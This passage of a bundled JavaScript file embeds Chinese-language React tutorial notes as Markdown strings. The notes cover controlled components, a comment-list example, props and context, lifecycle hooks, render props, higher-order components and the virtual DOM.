03:56:51\n * @FilePath       : /jinnian-space/src/pages/web/react/md/react基础Day02-受控组件&评论案例&props&context.md\n * @Description    : \n--\x3e\n# React组件\n\n## 目标\n\n- 能够知道受控组件是什么\n- 能够写出受控组件\n- 了解非受控组件\n\n## 表单处理\n\n### 受控组件（★★★）\n\n- HTML中的表单元素是可输入的，也就是有自己的可变状态\n- 而React中可变状态通常保存在state中，并且只能通过`setState()` 方法来修改\n- React讲state与表单元素值value绑定在一起，有state的值来控制表单元素的值\n- 受控组件：值受到react控制的表单元素\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/受控组件.png)\n\n#### 使用步骤\n\n- 在state中添加一个状态，作为表单元素的value值\n- 给表单元素绑定change事件，将表单元素的值设置为state的值\n\n#### 示例demo\n\n```react\nclass App extends React.Component {\n    constructor(){\n        super()\n        this.inputChange = this.inputChange.bind(this)\n    }\n    state = {\n        txt : ''\n    }\n    inputChange(e){\n       this.setState({\n           txt: e.target.value\n       })\n    }\n    render(){\n        console.log(this.state);\n        \n        return (\n            <div>\n                {/* 把state的值设置给输入框的value，绑定change事件，这样用户在输入内容的时候调用相应函数，在函数里面把当前设置的值赋值给state，从而达到数据的统一 */}\n                <input type=\"text\" value={this.state.txt} onChange={this.inputChange}/>\n            </div>\n        )\n    }\n}\nReactDOM.render(<App />,document.getElementById('root'))\n```\n\n#### 多表单元素优化\n\n- 问题：每个表单元素都有一个单独的事件处理函数，这样太繁琐\n- 优化：使用一个事件处理程序同时处理多个表单元素\n\n##### 步骤\n\n- 给表单元素添加name属性（用来区分是哪一个表单），名称与state相同（用来更新数据的）\n- 根据表单内容来获取对应值\n- 在change事件处理程序中通过 [name] 来修改对应的state\n\n##### 示例demo\n\n```react\ninputChange(e){\n   let target = e.target;\n   let value = target.type == 'checkbox' ? target.checked : target.value;\n   this.setState({\n       [e.target.name]: value\n   })\n}\n<input type=\"text\" value={this.state.txt} name=\"txt\" onChange={this.inputChange}/>\n<input type=\"checkbox\" value={this.state.isChecked} name=\"isChecked\" onChange={this.inputChange}/>\n```\n\n### 非受控组件 （了解）\n\n- 说明：借助于ref，使用元素DOM方式获取表单元素值\n- ref的作用：获取DOM或者组件\n\n#### 使用步骤\n\n- 调用 `React.createRef()` 方法创建ref对象\n- 将创建好的 ref 对象添加到文本框中\n- 通过ref对象获取到文本框的值\n\n```react\nclass App extends React.Component {\n    constructor(){\n        super()\n        \n        //创建 ref\n        this.txtRef = React.createRef()\n    }\n    // 获取文本框的值\n    getTxt =() => {\n        console.log(this.txtRef.current.value)\n    }\n    render(){\n        return (\n          <div>\n            <input type =\"text\" ref={this.txtRef} />\n            <button onClick ={this.getTxt}>获取值</button>\n          </div>\n        )\n    }\n}\n```\n\n# React组件综合案例（★★★）\n\n## 需求分析\n\n- 渲染评论列表（列表渲染）\n- 没有评论数据时渲染：暂无评论（条件渲染）\n- 获取评论信息，包括评论人和评论内容（受控组件）\n- 发表评论，更新评论列表（`setState()`）\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/综合案例.png)\n\n## 搭建评论列表的模板\n\n- 结构\n\n```react\nimport React from 'react'\nimport ReactDOM from 'react-dom'\n\n/* \n  评论列表案例\n\n  comments: [\n    { id: 1, name: 'jack', content: '沙发！！！' },\n    { id: 2, name: 'rose', content: '板凳~' },\n    { id: 3, name: 'tom', content: '楼主好人' }\n  ]\n*/\n\nimport './index.css'\n\nclass App extends React.Component {\n  render() {\n    return (\n      <div className=\"app\">\n        <div>\n          <input className=\"user\" type=\"text\" placeholder=\"请输入评论人\" />\n          <br />\n          <textarea\n            className=\"content\"\n            cols=\"30\"\n            rows=\"10\"\n            placeholder=\"请输入评论内容\"\n          />\n          <br />\n          <button>发表评论</button>\n        </div>\n\n        <div className=\"no-comment\">暂无评论，快去评论吧~</div>\n        <ul>\n          <li>\n            <h3>评论人：jack</h3>\n            <p>评论内容：沙发！！！</p>\n          </li>\n        </ul>\n      </div>\n    )\n  }\n}\n\n// 渲染组件\nReactDOM.render(<App />, document.getElementById('root'))\n```\n\n- 样式\n\n```css\n.app {\n  width: 300px;\n  padding: 10px;\n  border: 1px solid #999;\n}\n\n.user {\n  width: 100%;\n  box-sizing: border-box;\n  margin-bottom: 10px;\n}\n\n.content {\n  width: 100%;\n  box-sizing: border-box;\n  margin-bottom: 10px;\n}\n\n.no-comment {\n  text-align: center;\n  margin-top: 30px;\n}\n```\n\n## 渲染评论列表\n\n- 在state中初始化评论列表数据\n\n```react\n  state = {\n    comments: [\n      { id: 1, name: 'jack', content: '沙发！！！' },\n      { id: 2, name: 'rose', content: '板凳~' },\n      { id: 3, name: 'tom', content: '楼主好人' }\n    ]\n  }\n```\n\n- 使用数组的map方法遍历state中的列表数据\n- 给每一个被遍历的li元素添加key属性\n- 在render方法里的ul节点下嵌入表达式\n\n```react\n{\n  this.state.comments.map(item => {\n    return (\n       <li key={item.id}>\n          <h3>{item.name}</h3>\n          <p>{item.content}</p>\n       </li>\n    )\n  })\n}\n```\n\n## 渲染暂无评论\n\n- 判断列表数据的长度是否为0\n- 如果为0，则渲染暂无评论\n- 如果不为0，那么渲染列表数据\n\n- 在jsx中大量写逻辑会导致很臃肿，所以我们可以把条件渲染的逻辑抽取成一个函数\n\n```react\n/**\n * 条件渲染，这里抽取出来了，这样在结构中不会很混乱\n */\nrenderList(){\n  if (this.state.comments.length === 0) {\n    return (<div className=\"no-comment\">暂无评论，快去评论吧~</div>)\n  } else {\n    return (\n      <ul> {\n        this.state.comments.map(item => {\n          return (\n            <li key={item.id}>\n              <h3>{item.name}</h3>\n              <p>{item.content}</p>\n            </li>\n          )\n        })\n      }\n      </ul>\n    )\n  }\n}\n```\n\n- 在render的return方法里面调用这个函数即可\n\n```react\nrender() {\n  return (\n    <div>\n      ...\n      {/* 通过条件渲染来判断是否显示暂无评论 */}\n      {this.renderList()}\n    </div>\n  )\n}\n```\n\n## 获取评论信息\n\n- 通过受控组件来获取内容\n- 初始化用户名和用户内容的state\n\n```react\nuserName: '',\nuserContent: ''\n```\n\n- 在结构中，把表单元素的value与state进行绑定，还需要绑定name属性和onChange属性\n\n```react\n<input className=\"user\" type=\"text\" placeholder=\"请输入评论人\" value={this.state.userName} name=\"userName\" onChange={this.handleForm}/>\n<br />\n<textarea\n  className=\"content\"\n  cols=\"30\"\n  rows=\"10\"\n  placeholder=\"请输入评论内容\"\n  value={this.state.userContent}\n  name=\"userContent\"\n  onChange={this.handleForm}\n/>\n```\n\n- 在`handleFrom`函数中利用`setState`来让数据保持一致\n\n```react\n  handleForm = (e) => {\n     this.setState({\n       [e.target.name] : e.target.value\n     })\n  }\n```\n\n## 发表评论\n\n- 给按钮绑定事件\n- 在事件处理程序中，通过state获取评论信息\n- 将评论信息添加到state中，利用setState来更新页面\n- 添加评论前需要判断用户是否输入内容\n- 添加评论后，需要情况文本框用户输入的值\n\n```react\nhandleClick = (e) => {\n  // 拿到用户输入的内容\n  let {userName,userContent} = this.state\n  if(userName.trim()==='' || userContent.trim() === ''){\n      alert('请输入内容')\n      return\n  }\n  // 利用数组拓展运算符来进行数据的拼接，把用户输入的存放在数组的第一个位置\n  let newComments = [{\n    id: this.state.comments.length+1,\n    name: userName,\n    content: userContent\n  },...this.state.comments]\n  this.setState({\n    comments: newComments,\n    userName:'',\n    userContent: ''\n  })\n}\n```\n\n# React组件进阶\n\n## 目标\n\n- 能够使用props接收数据\n- 能够实现父子组件之间的通讯\n- 能够实现兄弟组件之间的通讯\n- 能够给组件添加props校验\n\n## 组件通讯介绍\n\n组件是独立且封闭的单元，默认情况下，只能使用组件自己的数据。在组件化过程中，我们将一个完整的功能拆分成多个组件，以更好的完成整个应用的功能。而在这个过程中，多个组件之间不可避免的要共享某些数据。为了实现这些功能，就需要打破组件的独立封闭性，让其与外界沟通，这个过程就是组件通讯\n\n## 组件的props（★★★）\n\n### 基本使用\n\n- 组件时封闭的，要接受外部数据应该通过props来实现\n- props的作用：接收传递给组件的数据\n- 传递数据：给组件标签添加属性\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/props-设置.png)\n\n- 接收数据：函数组件通过 参数 props接收数据，类组件通过 this.props接收数据\n\n  - 函数组件获取\n\n    ![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/函数组件获取.png)\n\n  - 类组件获取\n\n    ![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/类组件获取.png)\n\n\n​    \n\n### 特点\n\n- 可以给组件传递任意类型的数据 ： 字符串  数字 数组  对象  函数  jsx 组件\n- props是只读属性，不能对值进行修改\n- 注意：使用类组件时，如果写了构造函数，应该将props传递给super(),否则，无法在构造函数中获取到props，其他的地方是可以拿到的\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/类组件注意点.png)\n\n## 组件通讯的三种方式（★★★）\n\n### 父组件传递数据给子组件\n\n- 父组件提供要传递的state数据\n- 给子组件标签添加属性，值为state中的数据\n- 子组件中通过props接收父组件中传递的数据\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/父传子.png)\n\n### 子组件传递数据给父组件\n\n- 利用回调函数，父组件提供回调，子组件调用，将要传递的数据作为回调函数的参数\n- 父组件提供一个回调函数，用来接收数据\n- 将该函数作为属性的值，传递给子组件\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/子传父-父亲设置回调.png)\n\n- 子组件通过props调用回调函数\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/子传父-调用回调.png)\n\n### 兄弟组件传递\n\n- 将共享状态(数据)提升到最近的公共父组件中，由公共父组件管理这个状态\n- 这个称为状态提升\n- 公共父组件职责：1. 提供共享状态 2.提供操作共享状态的方法\n- 要通讯的子组件只需要通过props接收状态或操作状态的方法\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/兄弟传递.png)\n\n#### 示例demo\n\n- 定义布局结构，一个Counter里面包含两个子组件，一个是计数器的提示，一个是按钮\n\n```react\nclass Counter extends React.Component {\n    render() {\n        return (<div>\n            <Child1 />\n            <Child2 />\n        </div>\n        )\n    }\n}\nclass Child1 extends React.Component {\n    render() {\n        return (\n            <h1>计数器：</h1>\n        )\n    }\n}\nclass Child2 extends React.Component {\n    render() {\n        return (\n            <button>+1</button>\n        )\n    }\n}\n```\n\n- 在父组件里定义共享状态，把这个状态传递给第一个子组件\n\n```react\nclass Counter extends React.Component {\n    // 提供共享的状态\n    state = {\n        count: 0\n    }\n    render() {\n        return (<div>\n            {/* 把状态提供给第一个子组件 */}\n            <Child1 count={this.state.count}/>\n            <Child2 />\n        </div>\n        )\n    }\n}\n```\n\n- 在第一个子组件里面就能通过props获取到\n\n```react\nclass Child1 extends React.Component {\n    render() {\n        return (\n            <h1>计数器：{this.props.count}</h1>\n        )\n    }\n}\n```\n\n- 在父组件中提供共享方法，通过属性传递给第二个子组件，方便第二个子组件来进行调用\n\n```react\n    // 提供共享方法\n    onIncrement = (res) => {\n        // 只要第二个子组件调用了这个函数，就会执行里面代码\n        this.setState({\n            count: this.state.count + res\n        })\n    }\n    render() {\n        return (<div>\n            ...\n            {/* 把共享方法提供给第二个子组件 */}\n            <Child2 onIncrement={this.onIncrement} />\n        </div>\n        )\n    }\n```\n\n- 在第二个子组件里面通过props来获取到对应函数，然后进行调用\n\n```react\nclass Child2 extends React.Component {\n    handleClick = () => {\n        // 这里一旦调用，就会执行父组件里面 onIncrement函数\n        this.props.onIncrement(2)\n    }\n    render() {\n        return (\n            <button onClick={this.handleClick}>+</button>\n        )\n    }\n}\n```\n\n## Context（★★★）\n\n如果出现层级比较多的情况下（例如：爷爷传递数据给孙子），我们会使用Context来进行传递\n\n作用： 跨组件传递数据\n\n### 使用步骤\n\n- 调用 `React.createContext()` 创建 Provider(提供数据) 和 Consumer(消费数据) 两个组件\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/创建Context.png)\n\n- 使用Provider 组件作为父节点\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/provider.png)\n\n- 设置value属性，表示要传递的数据\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/设置value属性.png)\n\n- 哪一层想要接收数据，就用Consumer进行包裹，在里面回调函数中的参数就是传递过来的值\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/Comsumer.png)\n\n### 小结\n\n- 如果两个组件相隔层级比较多，可以使用Context实现组件通讯\n- Context提供了两个组件：Provider 和 Consumer\n- Provider组件： 用来提供数据\n- Consumer组件： 用来消费数据\n\n## props进阶\n\n### children属性\n\n- children属性： 表示组件标签的子节点，当组件标签有子节点时，props就会有该属性\n- children属性与普通的props一样，值可以使任意值（文本、react元素、组件、甚至是函数）\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/props-children.png)\n\n\n\n### props校验（★★★）\n\n- 对于组件来说，props是外来的，无法保证组件使用者传入什么格式的数据，简单来说就是组件调用者可能不知道组件封装着需要什么样的数据\n- 如果传入的数据不对，可能会导致报错\n- 关键问题：组件的使用者不知道需要传递什么样的数据\n- props校验：允许在创建组件的时候，指定props的类型、格式等\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/props-校验.png)\n\n- 作用：捕获使用组件时因为props导致的错误，给出明确的错误提示，增加组件的健壮性\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/props-错误提示.png)\n\n#### 使用步骤\n\n- 安装包  `prop-types (yarn add prop-types | npm i prop-types)`\n- 导入prop-types 包\n- 使用`组件名.propTypes={}` 来给组件的props添加校验规则\n- 校验规则通过PropTypes对象来指定\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/propsTypes.png)\n\n\n\n#### 常见的约束规则\n\n- 创建的类型： `array、bool、func、number、object、string`\n- React元素类型：`element`\n- 必填项：`isRequired`\n- 特定结构的对象： `shape({})`\n- 更多的[约束规则](<https://zh-hans.reactjs.org/docs/typechecking-with-proptypes.html#proptypes>)\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/props-约束规则.png)\n\n### props的默认值\n\n- 场景：分页组件 -> 每页显示条数\n\n![](./img/web/react/react基础Day02-受控组件&评论案例&props&context/props默认值.png)",bi={data:function(){return{MainComponent1:di,MainComponent2:gi}},methods:{extendMarkdown:function(n){n.renderer.rules.image=function(n,r,t,e,a){var i=n[r];return i.attrSet("class","q-markdown--image"),a.renderToken(n,r,t)}}}},vi=bi,hi=Object(u["a"])(vi,ui,mi,!1,null,"7d0f5d0a",null),Si=hi.exports,yi=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}}),t("q-markdown",{attrs:{src:n.MainComponent1}})],1)},fi=[],_i="\x3c!--\n * @Date           : 2021-05-05 07:12:53\n * @FilePath       : /jinnian-space/src/pages/web/react/md/react基础Day03-生命周期&render props模式&高阶组件&原理揭秘.md\n * @Description    : \n--\x3e\n# 组件生命周期（★★★）\n\n## 目标\n\n- 说出组件生命周期对应的钩子函数\n- 钩子函数调用的时机\n\n## 概述\n\n意义：组件的生命周期有助于理解组件的运行方式，完成更复杂的组件功能、分析组件错误原因等\n\n组件的生命周期： 组件从被创建到挂载到页面中运行，再到组件不在时卸载的过程\n\n生命周期的每个阶段总是伴随着一些方法调用，这些方法就是生命周期的钩子函数\n\n构造函数的作用：为开发人员在不同阶段操作组件提供了时机\n\n## 生命周期阶段\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/生命周期.png)\n\n### 创建时（挂载阶段）\n\n- 执行时机：组件创建时（页面加载时）\n- 执行顺序\n \n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/创建时-函数执行顺序.png)\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/创建时-函数的作用.png)\n\n### 更新时\n\n执行时机：`setState()、 forceUpdate()、 组件接收到新的props`\n\n说明：以上三者任意一种变化，组件就会重新渲染\n\n执行顺序：\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/更新时.png)\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/更新时-函数作用.png)\n\n### 卸载时\n\n执行时机：组件从页面中消失\n\n作用：用来做清理操作  清理 定时器 以及一些 特殊的绑定 回调  window.addEventListene\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/卸载时.png)\n\n### 不常用的钩子函数\n\n#### 旧版的生命周期钩子函数\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/旧版生命周期函数.png)\n\n#### 新版完整生命会走棋钩子函数\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/新版生命周期函数.png)\n\n##### `getDerivedStateFromProps()`\n\n- **`getDerivedStateFromProps`** 会在调用 render 方法之前调用，并且在初始挂载及后续更新时都会被调用。它应返回一个对象来更新 state，如果返回 null 则不更新任何内容\n- 不管原因是什么，都会在*每次*渲染前触发此方法\n\n##### `shouldComponentUpdate()`\n\n- 根据 **`shouldComponentUpdate()`** 的返回值，判断 React 组件的输出是否受当前 state 或 props 更改的影响。默认行为是 state 每次发生变化组件都会重新渲染\n- 当 props 或 state 发生变化时，**`shouldComponentUpdate()`** 会在渲染执行之前被调用。返回值默认为 true\n\n##### `getSnapshotBeforeUpdate()`\n\n- **`getSnapshotBeforeUpdate()`** 在最近一次渲染输出（提交到 DOM 节点）之前调用。它使得组件能在发生更改之前从 DOM 中捕获一些信息（例如，滚动位置）。此生命周期的任何返回值将作为参数传递给 **`componentDidUpdate()`**\n- 此用法并不常见，但它可能出现在 UI 处理中，如需要以特殊方式处理滚动位置的聊天线程等\n\n# render-props模式 （★★★）\n\n## 目标\n\n- 知道render-props模式有什么作用\n- 能够说出render-props的使用步骤\n\n## React组件复用概述\n\n- 思考：如果两个组件中的部分功能相似或相同，该如何处理？\n- 处理方式：复用相似的功能\n- 复用什么？\n  - state\n  - 操作state的方法\n- 两种方式：\n  - render props模式\n  - 高阶组件（HOC）\n- 注意： 这两种方式不是新的API，而是利用React自身特点的编码技巧，演化而成的固定模式\n\n## 思路分析\n\n- 思路：将要复用的state和操作state的方法封装到一个组件中\n\n- 如何拿到该组件中复用的state\n\n  - 在使用组件时，添加一个值为函数的prop，通过函数参数来获取\n\n    ![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/render-props-01.png)\n\n- 如何渲染到任意的UI\n\n  - 使用该函数的返回值作为要渲染的UI内容\n\n    ![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/render-props-02.png)\n\n## 使用步骤\n\n- 创建Mouse组件，在组件中提供复用的逻辑代码\n- 将要复用的状态作为 props.render(state)方法的参数，暴露到组件外部\n- 使用props.render() 的返回值作为要渲染的内容\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/render-props模式-01.png)\n\n#### 示例demo\n\n```react\nclass Mouse extends React.Component {\n    // 鼠标位置状态\n    state = {\n        x: 0,\n        y: 0\n    }\n\n    // 监听鼠标移动事件\n    componentDidMount(){\n        window.addEventListener('mousemove',this.handleMouseMove)\n    }\n    handleMouseMove = e => {\n        this.setState({\n            x: e.clientX,\n            y: e.clientY\n        })\n    }\n    render(){\n        // 向外界提供当前子组件里面的数据\n        return this.props.render(this.state)\n    }\n}\nclass App extends React.Component {\n    render() {\n        return (\n            <div>\n                App\n                <Mouse render={mouse => {\n                    return <p>X{mouse.x}Y{mouse.y}</p>\n                }}/>\n            </div>\n        )\n    }\n}\nReactDOM.render(<App />,document.getElementById('root'))\n```\n\n## children代替render属性\n\n- 注意：并不是该模式叫 render props就必须使用名为render的prop，实际上可以使用任意名称的prop\n- 把prop是一个函数并且告诉组件要渲染什么内容的技术叫做： render props模式\n- 推荐：使用childre代替render属性\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/render-props-children模式.png)\n\n## 优化代码\n\n- 推荐给render props模式添加props校验\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/优化-添加校验.png)\n\n-  \n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/优化-移除事件绑定.png)\n\n\n\n# 高阶组件 （★★★）\n\n## 目标\n\n- 知道高阶组件的作用\n- 能够说出高阶的使用步骤\n\n## 概述\n\n- 目的：实现状态逻辑复用\n- 采用 包装模式\n- 手机：获取保护功能\n- 手机壳：提供保护功能\n- 高阶组件就相当于手机壳，通过包装组件，增强组件功能\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/手机壳.png)\n\n## 思路分析\n\n- 高阶组件(HOC、Higher-Order Component) 是一个函数，接收要包装的组件，返回增强后的组件\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/高阶组件-函数.png)\n\n- 高阶组件内部创建了一个类组件，在这个类组件中提供复用的状态逻辑代码，通过prop将复用的状态传递给被包装组件`WrappedComponent`\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/高阶组件-类组件内部实现.png)\n\n## 使用步骤\n\n- 创建一个函数，名称约定以with开头\n- 指定函数参数，参数应该以大写字母开头\n- 在函数内部创建一个类组件，提供复用的状态逻辑代码，并返回\n- 在该组件中，渲染参数组件，同时将状态通过prop传递给参数组件\n- 调用该高阶组件，传入要增强的组件，通过返回值拿到增强后的组件，并将其渲染到页面\n\n**包装函数**\n\n```react\n// 定义一个函数，在函数内部创建一个相应类组件\nfunction withMouse(WrappedComponent) {\n    // 该组件提供复用状态逻辑\n    class Mouse extends React.Component {\n        state = {\n            x: 0,\n            y: 0\n        }\n        // 事件的处理函数\n        handleMouseMove = (e) => {\n            this.setState({\n                x: e.clientX,\n                y: e.clientY\n            })\n        }\n        // 当组件挂载的时候进行事件绑定\n        componentDidMount() {\n            window.addEventListener('mousemove', this.handleMouseMove)\n        }\n        // 当组件移除时候解绑事件\n        componentWillUnmount() {\n            window.removeEventListener('mousemove', this.handleMouseMove)\n        }\n        render() {\n            // 在render函数里面返回传递过来的组件，把当前组件的状态设置进去\n            return <WrappedComponent {...this.state} />\n        }\n    }\n    return Mouse\n}\n```\n\n**哪个组件需要加强，通过调用`withMouse`这个函数，然后把返回的值设置到父组件中即可**\n\n```react\nfunction Position(props) {\n    return (\n        <p>\n            X:{props.x}\n            Y:{props.y}\n        </p>\n    )\n}\n// 把position 组件来进行包装\nlet MousePosition = withMouse(Position)\n\nclass App extends React.Component {\n    constructor(props) {\n        super(props)\n    }\n    render() {\n        return (\n            <div>\n                高阶组件\n                <MousePosition></MousePosition>\n            </div>\n        )\n    }\n}\n```\n\n## 设置`displayName`\n\n- 使用高阶组件存在的问题：得到两个组件的名称相同\n- 原因：默认情况下，React使用组件名称作为`displayName`\n- 解决方式：为高阶组件设置`displayName`，便于调试时区分不同的组件\n- `displayName的作用：用于设置调试信息(React Developer Tools信息)`\n- 设置方式：\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/高阶组件-displayName.png)\n\n## 传递props\n\n- 问题：如果没有传递props，会导致props丢失问题\n- 解决方式： 渲染`WrappedComponent`时，将state和props一起传递给组件\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/传递props.png)\n\n## 小结\n\n- 组件通讯是构建React应用必不可少的一环\n- props的灵活性让组件更加强大\n- 状态提升是React组件的常用模式\n- 组件生命周期有助于理解组件的运行过程\n- 钩子函数让开发者可以在特定的时机执行某些功能\n- `render props` 模式和高阶组件都可以实现组件状态逻辑的复用\n- 组件极简模型： `(state,props) => UI`\n\n# React原理\n\n## 目标\n\n- 能够知道`setState()`更新数据是异步的\n- 能够知道JSX语法的转化过程\n\n## `setState()`说明 （★★★）\n\n### 更新数据\n\n- `setState()`更新数据是异步的\n- 注意：使用该语法，后面的`setState`不要依赖前面`setState`的值\n- 多次调用`setState`，只会触发一次render\n\n### 推荐语法 \n\n- 推荐：使用 `setState((state,props) => {})` 语法\n- 参数state： 表示最新的state\n- 参数props： 表示最新的props\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/推荐语法.png)\n\n\n\n### 第二个参数\n\n- 场景：在状态更新(页面完成重新渲染)后立即执行某个操作\n- 语法：`setState(update[,callback])`\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/第二个参数.png)\n\n## JSX语法的转化过程 （★★★）\n\n- JSX仅仅是`createElement()` 方法的语法糖(简化语法)\n- JSX语法被 @babel/preset-react 插件编译为`createElement()` 方法\n- React 元素： 是一个对象，用来描述你希望在屏幕上看到的内容\n\n![](./img/web/react/react基础Day03-生命周期-高阶组件原理揭秘/语法糖.png)",xi="\x3c!--\n * @Date           : 2021-05-05 07:16:13\n * @FilePath       : /jinnian-space/src/pages/web/react/md/react基础Day04-React原理揭秘&React路由基础.md\n * @Description    : \n--\x3e\n# React原理揭秘\n\n## 目标\n\n- 能够说出React组件的更新机制\n- 能够对组件进行性能优化\n- 能够说出虚拟DOM和DIff算法\n\n## 组件更新机制\n\n- setState() 的两个作用\n  - 修改state\n  - 更新组件\n\n- 过程：父组件重新渲染时，也会重新渲染子组件，但只会渲染当前组件子树（当前组件以其所有子组件）\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/组件更新.png)\n\n## 组件性能优化\n\n### 减轻state\n\n- 减轻state：只存储跟组件渲染相关的数据（比如：count/ 列表数据 /loading等）\n- 注意：不用做渲染的数据不要放在state中\n- 对于这种需要在多个方法中用到的数据，应该放到this中\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/减轻state.png)\n\n### 避免不必要的重新渲染\n\n- 组件更新机制：父组件更新会引起子组件也被更新，这种思路很清晰\n- 问题：子组件没有任何变化时也会重新渲染\n- 如果避免不必要的重新渲染？\n- 解决方式：使用钩子函数 shouldComponentUpdate(nextProps, nextState)\n  - 在这个函数中，nextProps和nextState是最新的状态以及属性\n- 作用：这个函数有返回值，如果返回true，代表需要重新渲染，如果返回false，代表不需要重新渲染\n- 触发时机：更新阶段的钩子函数，组件重新渲染前执行(shouldComponentUpdate => render)\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/shouldComponentUpdata.png)\n\n#### 随机数案例\n\n需求：随机生成数字，显示在页面，如果生成的数字与当前显示的数字相同，那么就不需要更新UI，反之更新UI。\n\n利用nextState参数来判断当前组件是否需要更新\n\n```react\nclass App extends React.Component {\n    state = {\n        number: 0\n    }\n    // 点击事件，每次点击生成一个随机数\n    hanldeBtn = () => {\n        this.setState({\n            number: Math.floor(Math.random() * 3)\n        })\n    }\n    // 将要更新UI的时候会执行这个钩子函数\n    shouldComponentUpdate(nextProps,nextState) {\n         // 判断一下当前生成的 值是否与页面的值相等\n         if(nextState.number !== this.state.number){\n             return true\n         }\n         return false\n    }\n    render() {\n        return (\n            <div>\n                随机数：{this.state.number} <br />\n                <button onClick={this.hanldeBtn}>生成随机数</button>\n            </div>\n        )\n    }\n}\n```\n\n利用props参数来判断是否需要进行更新\n\n```react\nclass App extends React.Component {\n    state = {\n        number: 0\n    }\n    // 点击事件，每次点击生成一个随机数\n    hanldeBtn = () => {\n        this.setState({\n            number: Math.floor(Math.random() * 3)\n        })\n    }\n\n    render() {\n        return (\n            <div>\n                <NumberBox number={this.state.number} />\n                <button onClick={this.hanldeBtn}>生成随机数</button>\n            </div>\n        )\n    }\n}\nclass NumberBox extends React.Component {\n    // 将要更新UI的时候会执行这个钩子函数\n    shouldComponentUpdate(nextProps, nextState) {\n        // 判断一下当前生成的 值是否与页面的值相等\n        if (nextProps.number !== this.props.number) {\n            return true\n        }\n        return false\n    }\n    render() {\n        return (\n            <h1>随机数：{this.props.number} </h1>\n        )\n    }\n}\n```\n\n### 纯组件\n\n#### 作用以及使用\n\n- 纯组件： PureComponent 与 React.Component 功能相似\n- 区别： PureComponent 内部自动实现了 shouldComponentUpdate钩子，不需要手动比较\n- 原理：纯组件内部通过分别比对前后两次 props和state的值，来决定是否重新渲染组件\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/PureComponent.png)\n\n#### 实现原理\n\n- 说明：纯组件内部的对比是 shallow compare（浅层对比）\n- 对于值类型来说：比较两个值是否相同\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/值类型比对.png)\n\n- 引用类型：只比对对象的引用地址是否相同\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/引用类型比对.png)\n\n- 注意：state 或 props 中属性值为引用类型时，应该创建新数据，不要直接修改原数据\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/注意点.png)\n\n## 虚拟DOM和Diff算法\n\n- React更新视图的思想是：只要state变化就重新渲染视图\n- 特点：思路非常清晰\n- 问题：组件中只有一个DOM元素需要更新时，也得把整个组件的内容重新渲染吗？ 不是这样的\n- 理想状态：部分更新，只更新变化的地方\n- React运用的核心点就是 虚拟DOM 配合 Diff 算法\n\n### 虚拟DOM\n\n本质上就是一个JS对象，用来描述你希望在屏幕上看到的内容\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/虚拟DOM.png)\n\n### Diff算法\n\n执行过程\n\n- 初次渲染时，React会根据初始化的state（model），创建一个虚拟DOM对象（树）\n- 根据虚拟DOM生成真正的DOM，渲染到页面\n- 当数据变化后(setState())，会重新根据新的数据，创建新的虚拟DOM对象（树）\n- 与上一次得到的虚拟DOM对象，使用Diff算法比对（找不同），得到需要更新的内容\n- 最终，React只将变化的内容更新（patch）到DOM中，重新渲染到页面\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/diff算法.png)\n\n### 代码演示\n\n- 组件render()调用后，根据状态和JSX结构生成虚拟DOM对象(render()方法的调用并不意味着浏览器进行渲染，render方法调用时意味着Diff算法开始比对了)\n- 示例中，只更新p元素的文本节点内容\n- 初次渲染的DOM对象\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/初次的虚拟DOM对象.png)\n\n- 